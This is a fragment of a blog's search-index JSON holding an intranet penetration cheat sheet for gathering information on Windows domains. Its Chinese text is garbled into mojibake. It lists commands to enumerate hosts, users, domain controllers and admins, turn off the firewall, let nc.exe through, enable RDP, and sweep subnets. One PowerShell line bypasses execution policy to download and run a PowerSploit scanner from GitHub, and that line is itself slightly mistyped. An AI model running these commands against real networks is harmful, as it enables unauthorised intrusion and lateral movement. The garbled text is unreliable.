","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å†…ç½‘ä¿¡æ¯æ”¶é›†å‘½ä»¤æ‰‹å†Œ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å†…ç½‘ä¿¡æ¯æ”¶é›† ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ”¶é›†æœ¬æœºä¿¡æ¯ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ‰‹åŠ¨ä¿¡æ¯æœé›† æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯ ipconfig /all æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠè½¯ä»¶çš„ä¿¡æ¯ æŸ¥è¯¢æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯ systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" systeminfo | findstr /B /C:\"OS åç§°\" /C:\"OS ç‰ˆæœ¬\" æŸ¥è¯¢ç³»ç»Ÿä½“ç³»ç»“æ„ echo %PROCESSOR_ARCHITECTURE% æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶ã€ç‰ˆæœ¬åŠè·¯å¾„ç­‰ wmic product get name, version powershell \"Get-WmiObject -class Win32_Product | select-Object -Property name, version\" æŸ¥è¯¢æœ¬æœºæœåŠ¡ wmic service list brief æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨ tasklist wmic process list brief æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯ wmic startup get command, caption æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ schtasks /query /fo LIST /v æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´ net statistics workstation æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨ net user net localgroup administrators # æŸ¥è¯¢åœ¨çº¿ç”¨æˆ·ï¼š query user || qwinsta åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯ net session æŸ¥è¯¢ç«¯å£åˆ—è¡¨ netstat -ano æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨ systeminfo wmic qfe get Caption,Description,HotfixID,InstalledOn æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨ net share wmic share get name,path,status æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨ route print arp -a æŸ¥è¯¢é˜²ç«å¢™ç›¸å…³é…ç½® å…³é—­é˜²ç«å¢™ Windows2003ä¹‹å‰ç‰ˆæœ¬ netsh firewall set opmode disable Windows2003ä¹‹åç‰ˆæœ¬ netsh firewall set allprofiles state off ä¿®æ”¹é˜²ç«å¢™é…ç½® Windows2003ä¹‹å‰ç‰ˆæœ¬ netsh firewall add allowedprogram c:\\nc.exe \"allow nc\" enable Windows2003ä¹‹åç‰ˆæœ¬ netsh firewall add rule name=\"pass nc\" dir=in action=allow program=\"C:\\nc.exe\" å…è®¸æŒ‡å®šç¨‹åºè¿å‡º netsh advfirewall firewall add rule name=\"Allow nc\" dir=out action=allow program=\"C:\\nc.exe\" å…è®¸3389æ”¾è¡Œ netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å­˜å‚¨ä½ç½® netsh advfirewall firewall set currentprofile logging filename \"C:\\windows\\temp\\fw.log\" æŸ¥çœ‹ä»£ç†æƒ…å†µ reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡ æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£ reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber 0xd3dè½¬æ¢æˆ10è¿›åˆ¶ä¸º3389 åœ¨Windows Server2003ä¸­å¼€å¯3389ç«¯å£ wmic path win32_terminalservicesetting where(__CLASS!=\"\") call setallowtsconnections 1 åœ¨Windows Server2008å’ŒWindows Server2012ä¸­å¼€å¯3389ç«¯å£ wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS!=\"\") call setallowsconnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =â€™RDP-Tcpâ€™) call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è‡ªåŠ¨åŒ–æ”¶é›†ä¿¡æ¯ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Empireä¸‹çš„ä¸»æœºä¿¡æ¯æœé›† ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥çœ‹æœ¬æœºç”¨æˆ·ã€åŸŸæˆå‘˜ã€å¯†ç è®¾ç½®æ—¶é—´ã€å‰ªåˆ‡æ¿å†…å®¹ã€ç³»ç»ŸåŸºæœ¬ä¿¡æ¯ã€ç½‘ç»œé€‚é…å™¨ä¿¡æ¯ã€å…±äº«ä¿¡æ¯ usemodule situational_awareness/host/winenum situational_awareness/host/computerdetails ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢å½“å‰æƒé™ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢å½“å‰æƒé™ whoami ä¸‰ç§æƒ…å†µï¼š æœ¬åœ°æ™®é€šç”¨æˆ· æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ· åŸŸå†…ç”¨æˆ· ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è·å–åŸŸ SID whoami /all ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ net user XXX /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:4:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ ipconfig å‘½ä»¤ ipconfig /all ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯ systeminfo ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç”¨æˆ·ä¿¡æ¯ net config workstation ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åˆ¤æ–­ä¸»åŸŸ net time /domain æ‰§è¡Œå‘½ä»¤åï¼Œå­˜åœ¨ä¸‰ç§æƒ…å†µï¼š å­˜åœ¨åŸŸï¼šå½“å‰ä¸æ˜¯åŸŸç”¨æˆ· å‘ç”Ÿç³»ç»Ÿé”™è¯¯ å­˜åœ¨åŸŸï¼šä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ· å¦‚ä¸Šå›¾ å½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„ æ‰¾ä¸åˆ°åŸŸæ§åˆ¶å™¨ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:5:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœº ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åˆ©ç”¨ NetBIOS å¿«é€Ÿæ¢æµ‹å†…ç½‘ nbtscan.exe 192.168.1.0/20 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åˆ©ç”¨ ICMP åè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘ for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr \"TTL=\" ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"é€šè¿‡ ARP æ‰«ææ¢æµ‹å†…ç½‘ arp-scanå·¥å…· arp.exe -t 192.168.1.0/20 Empire ä¸­çš„ ARPscan æ¨¡å— usemodule situational_awareness/network/arpscan Nishang ä¸­çš„ Invoke-ARPScan.ps1 è„šæœ¬ powershell.exe -exec bypass -Command \"\u0026{Import-Module C:\\windows\\temp\\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24}\" \u003e\u003e C:\\Windows\\temp\\log.txt ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ‰«æå†…ç½‘ç«¯å£ metasploit ç«¯å£æ‰«æ auxiliary/scanner/portscan/tcp PowerSploit çš„ Invoke-portscan.ps1 è„šæœ¬ powershell.exe -nop -exec bypass -c \"IEX (New-ObjectNet.WebClient).DownloadString('https://raw.githubusercontent.com/POwershellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA c:\\windows\\temp\\rex.txt\" Nishang çš„ Invoke-PortScan æ¨¡å— Invoke-Portscan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost ç«¯å£ banner ä¿¡æ¯ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:6:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ”¶é›†åŸŸå†…åŸºç¡€ä¿¡æ¯ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢åŸŸ net view /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº net view /domain:HACKE ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·åˆ—è¡¨ net group /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢åŸŸå†…æ‰€æœ‰æˆå‘˜è®¡ç®—æœºåˆ—è¡¨ net group \"domain computers\" /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢åŸŸå¯†ç ä¿¡æ¯ net accounts /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è·å–åŸŸä¿¡ä»»ä¿¡æ¯ nltest /domain_trusts ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:6","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„æœºå™¨å nltest /DCLIST:DomainName ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºå nslookup -type=SRV _ldap._tcp. ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥çœ‹å½“å‰æ—¶é—´ net time /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„ net group \"Domain Controllers\" /domain netdom query pdc ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:9:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨ å‘åŸŸæ§æœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ net user /domain è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ wmic useraccount get /all æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ· dsquery user æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ· net localgroup administrators ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:9:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ· æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ· net group \"domain admins\" /domain æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ· net group \"Enterprise Admins\" /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:9:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å®šä½åŸŸç®¡ç†å‘˜ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:10:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¸¸ç”¨å·¥å…· pslogon.exe pslogon.exe \\\\DC PVEFindADUser.exe PVEFindADUser.exe -current netview.exe nmapçš„è„šæœ¬ å¯¹åŸŸæ§è¿›è¡Œä¿¡æ¯æœé›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ï¼Œç”¨æˆ·ç­‰ä¿¡æ¯ smb-enum-sessions.nse è·å¾—æŸå°ä¸»æœºçš„æƒé™ï¼Œä½†æ˜¯æ— æ³•è·å–æ›´å¤šçš„åŸŸç”¨æˆ·ä¿¡æ¯ Smb-enum-users.nse éå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½• smb-enum-shares.nse å¯¹ä¸»æœºè¿œç¨‹è¿›ç¨‹è¿›è¡Œéå† smb-enum-process.nse 